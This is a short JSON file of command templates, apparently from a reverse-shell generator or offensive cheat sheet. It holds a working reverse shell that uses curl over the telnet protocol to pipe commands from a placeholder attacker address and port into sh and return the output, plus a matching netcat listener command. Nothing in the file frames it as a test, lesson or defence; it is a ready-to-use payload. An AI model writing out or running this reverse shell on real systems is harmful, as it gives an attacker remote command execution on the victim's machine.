{
  "commands": [
    {
      "title": "Curl reverse shell",
      "template": "C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null",
      "description": "Reverse shell using curl over the telnet protocol to execute commands remotely."
    },
    {
      "title": "Netcat Listener",
      "template": "nc -lvnp {port}"
    }
  ]
}
